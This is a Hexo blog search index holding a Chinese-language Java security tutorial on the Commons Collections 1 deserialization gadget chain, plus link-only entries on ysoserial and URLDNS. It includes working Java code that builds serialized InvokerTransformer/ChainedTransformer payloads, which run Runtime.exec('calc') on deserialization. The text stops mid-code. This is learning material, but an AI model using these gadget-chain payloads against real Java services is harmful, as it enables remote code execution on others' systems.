<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ysoserial工具介绍以及jar包调试方法</title>
      <link href="/2024/01/23/ysoserial%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8Ajar%E5%8C%85%E8%B0%83%E8%AF%95%E6%96%B9%E6%B3%95/"/>
      <url>/2024/01/23/ysoserial%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8Ajar%E5%8C%85%E8%B0%83%E8%AF%95%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p><a href="https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar">ysoserial</a></p><p><strong>参考文章：</strong></p><p><a href="https://wx.zsxq.com/dweb2/index/topic_detail/244415545824541">https://wx.zsxq.com/dweb2/index/topic_detail/244415545824541</a></p><p><a href="https://juejin.cn/post/7072633691440152606">https://juejin.cn/post/7072633691440152606</a></p>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 0-1 javaSec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>URLDNS链</title>
      <link href="/2024/01/23/URLDNS%E9%93%BE/"/>
      <url>/2024/01/23/URLDNS%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p><em><strong>参考文章：</strong></em></p><p><a href="https://blog.csdn.net/weixin_34346099/article/details/91940085">https://blog.csdn.net/weixin_34346099/article/details/91940085</a></p><p><a href="https://xz.aliyun.com/t/9116?time__1311=n4+xuDgD9DyDnDfhx0xxBqDwp00ieT++HmD&amp;alichlgref=https://www.google.com/">https://xz.aliyun.com/t/9116?time__1311=n4%2BxuDgD9DyDnDfhx0xxBqDwp00ieT%2B%2BHmD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F</a></p><p><a href="https://www.cnblogs.com/nice0e3/p/13772184.html#0x04-%E7%BB%93%E5%B0%BE">https://www.cnblogs.com/nice0e3/p/13772184.html#0x04-%E7%BB%93%E5%B0%BE</a></p><p><a href="https://github.com/phith0n/JavaThings">《java安全漫谈》</a></p>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 利用链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Commons Collections 1 利用链</title>
      <link href="/2024/01/21/Commons%20Collections%201%20%E5%88%A9%E7%94%A8%E9%93%BE/"/>
      <url>/2024/01/21/Commons%20Collections%201%20%E5%88%A9%E7%94%A8%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>前面的几篇文章中，我们学习了java反射机制、RMI、动态代理以及java反序列化的流程，这些内容其实涉及的只是一些前置知识，不过也是比较关键的一些知识，能够为我们接下来分析各种漏洞以及利用链做好铺垫（网上很多文章都是直接从利用链开始谈起，对于我这样的新手太不友好）。从本篇文章开始，我将分析各种漏洞的利用链。</p><h2 id="0x01-什么是利用链？什么是CC链"><a href="#0x01-什么是利用链？什么是CC链" class="headerlink" title="0x01 什么是利用链？什么是CC链"></a>0x01 什么是利用链？什么是CC链</h2><p>用p神的话：利⽤链也叫“gadget chains”，我们通常称为gadget。如果你学过PHP反序列化漏洞，那么就可以将 gadget理解为⼀种⽅法，它连接的是从触发位置开始到执⾏命令的位置结束，在PHP⾥可能 是 __desctruct 到 eval ；如果你没学过其他语⾔的反序列化漏洞，那么gadget就是⼀种⽣成POC的⽅法罢了。（之前我有学习过php反序列化的pop链，也正如这样描述的，以后有机会写篇文章分享一下）。</p><p>CC链作为java反序列化利用链的一种，是我们在学习java反序列化过程中不可跳过的一关。这里的CC是对Apache Commons Collections这个java第三方库的简称，它在java中提供了一些功能，可以更方便的管理Collection集合，因为方便，Commons Collections被广泛用于各种Java应用的开发，它提供很多强有力的数据结构类型，并且实现了各种集合工具类。其中反序列化漏洞就出现在这个库中，这意味着使用<strong>该库的漏洞版本</strong>的Java应用会面临<strong>反序列化漏洞</strong>的威胁。而我们的目的，就是研究这个库是如何产生并被利用反序列化漏洞的。</p><h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><p>对于利用链这块，网上文章很少有讲环境搭建的，导致我环境搭建就花了好长时间。。。</p><p>首先是环境要求：</p><ol><li><p>jdk1.7版本，这里我下载的是这个安装包：<a href="https://download.oracle.com/otn/java/jdk/7u80-b15/jdk-7u80-windows-x64.exe">jdk-7u80-windows-x64.exe</a></p></li><li><p>本文要研究的CC链：<a href="http://archive.apache.org/dist/commons/collections/binaries/">apache commons collection 3.1版本</a></p></li><li><p>IntelliJ IDEA</p></li></ol><p>准备好后，在IDEA里新建一个项目，选择安装好的jdk1.7。</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20240121131507555.png" alt="新建项目"></p><p>然后进入<code>文件-&gt;项目结果-&gt;模块</code>,在创建好的项目下选择<code>依赖</code>，点击<code>+</code>号，然后选择<code>1 JAR或目录……</code></p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20240121132227719.png" alt="进入依赖"></p><p>接着就是选择下载并解压好的commons collection 3.1文件夹下的jar包：</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20240121132825129.png" alt="导入CC jar包"></p><p>导入后，就可以在项目的外部库中看到这个CC jar包了。</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20240121132935038.png" alt="jar包成功导入"></p><h2 id="0x03-分析"><a href="#0x03-分析" class="headerlink" title="0x03 分析"></a>0x03 分析</h2><h3 id="前置知识点"><a href="#前置知识点" class="headerlink" title="前置知识点"></a>前置知识点</h3><p>前面介绍Commons Collections时说过，这个包提供很多强有力的数据结构类型，并且实现了各种集合工具类，其中我们需要关注的一个功能是：</p><blockquote><p>Transforming decorators that alter each object as it is added to the collection</p><p>转化装饰器：修改每一个添加到collection中的object</p></blockquote><p>在Commons Collections包中实现了一个TransformedMap类(<code>org.apache.commons.collections.map.TransformedMap</code>)，该类是对Java标准数据结构Map接口的一个扩展，该类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变换，具体的变换逻辑由Transformer类定义，Transformer在TransformedMap实例化时作为参数传入。</p><p><code>org.apache.commons.collections.Transformer</code>这个类可以满足固定的类型转化需求，其转化函数可以自定义实现，我们的漏洞触发函数就是在于这个点。</p><p>包括TransfomedMap在内，我们在构造利用链时要用到如下Class：</p><ol><li>InvokerTransformer</li><li>ChainedTrasnformer</li><li>ConstantTransformer</li><li>TransformedMap</li><li>AnotationInvocationHandler</li></ol><p>我们现在的目的就是执行<code>Runtime.getRuntime().exec("calc");</code>语句</p><p>那我们按照顺序一一来看。</p><h3 id="1-InvokerTransformer"><a href="#1-InvokerTransformer" class="headerlink" title="1. InvokerTransformer"></a>1. InvokerTransformer</h3><p>该类位于<code>org.apache.commons.collections.functors</code>中，我们重点看其中的transform方法（只看重点部分）：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> {</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="literal">null</span>) {</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            <span class="keyword">try</span> {</span><br><span class="line">                <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">                <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);</span><br><span class="line">            } <span class="comment">//省略</span></span><br><span class="line">        }</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><p>在该方法中，显示通过<code>input</code>的<code>getClass()</code>方法获得Class对象，然后获取Class中的<code>method(this.iMethodName, this.iParamTypes)</code>，再<code>method.invoke(input, this.iArgs)</code>触发方法。那么我们是否可以控制这些变量来完成一个反射呢？</p><p>InvokerTransformer有两个构造方法，其中一个可以让我们传入以上需要用到的<code>iMethodName,iParamTypes,iArgs</code>,即方法名、参数类型和参数本身</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> {</span><br><span class="line">        <span class="built_in">this</span>.iMethodName = methodName;</span><br><span class="line">        <span class="built_in">this</span>.iParamTypes = paramTypes;</span><br><span class="line">        <span class="built_in">this</span>.iArgs = args;</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><p>那么我们可以通过传入恶意的一些参数，从而利用反射达到RCE的效果，比如我们构造如下RCE：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Anchor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建invokerTransformer，并利用其构造函数对其成员变量iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">"exec"</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]{String.class}, <span class="keyword">new</span> <span class="title class_">String</span>[]{<span class="string">"calc"</span>});</span><br><span class="line">        <span class="comment">// 构造input - 这里我们需要一个Runtime Object， 用Runtime.getRuntime()的返回值可以得到</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">input</span> <span class="operator">=</span> Class.forName(<span class="string">"java.lang.Runtime"</span>).getDeclaredMethod(<span class="string">"getRuntime"</span>).invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>), <span class="literal">null</span>);</span><br><span class="line">        <span class="comment">// 执行payload</span></span><br><span class="line">        invokerTransformer.transform(input);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>成功弹出计算器：</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20240121142730581.png" alt="成功弹出计算器"></p><p>虽然成功RCE，但这还远没有接近真实场景，下面我们模拟一下客户端和服务器之间序列化和反序列化的过程（为了简便，客户端和服务端我就写到一个类里了）：</p><blockquote><p>需要注意的是，InvokerTransformer类实现了Serializable接口，所以该类是可以序列化的。</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20240121143308832.png" alt="InvokerTransformer实现了Serializable接口"></p></blockquote><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Anchor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException {</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 客户端构造payload，并序列化文件</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line">        <span class="comment">//首先创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">"exec"</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]{String.class}, <span class="keyword">new</span> <span class="title class_">String</span>[]{<span class="string">"calc"</span>});</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化，将构造的恶意类实例写入到payload.bin文件中</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">"payload.bin"</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(invokerTransformer);</span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 服务端反序列化读取，并执行payload</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">"payload.bin"</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">inv</span> <span class="operator">=</span> (InvokerTransformer) objectInputStream.readObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//构造input - 这里我们需要一个Runtime Object， 用Runtime.getRuntime()的返回值可以得到</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">input</span> <span class="operator">=</span> Class.forName(<span class="string">"java.lang.Runtime"</span>).getDeclaredMethod(<span class="string">"getRuntime"</span>).invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>),<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//执行payload</span></span><br><span class="line">        inv.transform(input);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>运行后一样成功弹出计算器。</p><p>如果我们直接利用这处反射机制作为漏洞的话，则需要服务端的开发人员“帮助”我们做以下事情才能触发漏洞：</p><ul><li>把反序列化后的Object强制转化为InvokerTransformer类型</li><li>构造Input - Runtime实例</li><li>刻意执行InvokerTransformer中的transform方法，并将Runtime实例以方法参数传入。</li></ul><p>实际中会有开发人员这么好心帮我们把这些都实现了吗？显然不会（除非开发人员自己人，hh）</p><p>所以现在我们就面临一些问题：</p><p>payload肯定要在客户端刻意自定义构造，再传输进入服务端</p><p>服务端需要把我们输入exp反序列化成一个在代码中可能使用的类，并且在代码正常操作中会调用这个类中的一个可出触发漏洞的函数（当然这个函数最后会进入我们InvokerTransformer类的transform函数，从而形成命令执行），如果这个反序列化的类和这个类触发命令执行的方法课可以在一个readObject复写函数中恰好触发，就对于服务端上下文语句没有要求了！</p><p>所以接下来我们就一个一个解决上述问题，首先是客户端自定义payload，即input参数的问题，这时要用到下面这个类。</p><h3 id="2-ChainedTransformer"><a href="#2-ChainedTransformer" class="headerlink" title="2.ChainedTransformer"></a>2.ChainedTransformer</h3><p>该类同样也位于<code>org.apache.commons.collections.functors</code>包中，使用它我们就可以自己来写input参数，自定义payload</p><p>在ChainedTransformer类中，也有一个transform方法，我们定位到它的源码：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> {</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="built_in">this</span>.iTransformers.length; ++i) {</span><br><span class="line">            object = <span class="built_in">this</span>.iTransformers[i].transform(object);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><p>它循环遍历了<code>iTransformers</code>数组中的每一个元素，每一次循环，它都会把<code>该元素.transform(object)</code>的结果（一个对象）赋值给<code>object</code>，并返回。这意味着，下一个元素执行的<code>transform()</code>方法中的参数就是上一个元素执行<code>transform()</code>方法的返回值，如此一来就是串行传递执行结果。</p><p>我们需要确定<code>iTransfomers</code>这个数组中的内容是否是我们可以自主控制的，定位到其构造函数中看看这个成员变量的来历：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> {</span><br><span class="line">    <span class="built_in">this</span>.iTransformers = transformers;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>显然我们是可以自定义该变量的内容的，又因为之前我们看到，<code>InvokerTransformer</code>不仅<code>implements</code>了<code>Serializa</code>接口，也<code>implements</code>了<code>Transformer</code>接口，那么<code>InvokerTransformer</code>的实例对象也是可以放在这个<code>iTransfomers</code>这个数组中的(不明白的去巩固巩固java基础)</p><p>所有就有下面的想法：让我们构造的<code>input</code>(Runtime实例)作为第一个遍历元素的返回值，再执行第二个元素的transform时，刚好就传入了input这个参数了。</p><p>但问题是，怎么让我们构造的<code>input</code>(Runtime实例)能被<code>Transformer</code>类或其子类的<code>transform()</code>方法中的返回呢？接下来就引入<code>ConstantTransformer</code>类</p><h3 id="3-ConstantTransformer-类"><a href="#3-ConstantTransformer-类" class="headerlink" title="3. ConstantTransformer 类"></a>3. ConstantTransformer 类</h3><p>该类也位于<code>org.apache.commons.collections.functors</code>包中,它同样也<code>implements</code>了<code>Transformer</code>类的，所以可以被放进<code>Transformer[]</code>数组，同样也有我们想要的<code>transform()</code>方法。顾名思义，该类其实只会存放一个常量；它的构造函数会写入这个变量，它的transform函数又会返回这个变量,其中构造函数和transform方法的源码如下：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> {</span><br><span class="line">        <span class="built_in">this</span>.iConstant = constantToReturn;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> {</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.iConstant;</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><p>我们可以在构造函数中将<code>Runtime.getRuntime()</code>得到的Runtime实例传给iConstant,这样链就连起来了：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Anchor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException {</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 客户端构造payload，并序列化文件</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]{</span><br><span class="line">                <span class="comment">//返回input(即Runtime实例)，并将它作为下面的transform()的方法参数传入</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line">                <span class="comment">//创建invokerTransformer，并利用构造方法对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">"exec"</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]{String.class}, <span class="keyword">new</span> <span class="title class_">String</span>[]{<span class="string">"calc"</span>})</span><br><span class="line">        };</span><br><span class="line">        <span class="comment">//将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">"payload.bin"</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(chainedTransformer);</span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 服务端反序列化读取，并触发漏洞</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">"payload.bin"</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">inv</span> <span class="operator">=</span> (ChainedTransformer) objectInputStream.readObject();</span><br><span class="line">        <span class="comment">//触发漏洞</span></span><br><span class="line">        inv.transform(<span class="string">"Anchor"</span>);<span class="comment">//这里任何值都可以,因为ConstantTransformer.transform(object)中的object中没有被用到</span></span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>该程序运行后直接报错，产生以下错误：</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20240121151826101.png" alt="NotSerializableException"></p><p>也就是说，Runtime类是不可以序列化的，我们看它的源码可以发现并没有实现<code>Serializa</code>接口，而我们是直接将通过<code>Runtime.getRuntime()</code>得到的Runtime实例序列化，所以产生错误。</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20240121152106929.png" alt="Runtime部分源码"></p><p>那么就另辟蹊径，我们通过反射方式获取Runtime实例，让服务端在反序列化时自己生成Runtime实例：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Anchor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException {</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 客户端构造payload，并序列化文件</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]{</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="comment">//返回Runtime Class</span></span><br><span class="line">                <span class="comment">//获取getRuntime方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">"getDeclaredMethod"</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]{String.class,Class[].class}, <span class="keyword">new</span> <span class="title 